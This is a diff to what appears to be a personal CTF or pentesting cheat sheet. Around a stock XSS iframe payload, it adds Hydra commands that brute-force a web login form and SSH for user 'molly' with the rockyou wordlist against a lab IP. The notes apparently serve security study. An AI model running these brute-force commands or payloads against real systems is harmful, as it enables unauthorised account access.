@@ -18,6 +18,13 @@
 
 - https://github.com/payloadbox/xss-payload-list --> Payload XSS
 	- <iframe src="javascript:alert(`xss`)">
+	
+## BruteForce
+### Hydra
+
+- Password web --> hydra -l molly -P rockyou.txt 10.10.212.76 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
+
+- Password SSH --> hydra -l molly -P rockyou.txt 10.10.212.76 ssh
 
 
 ## Linux
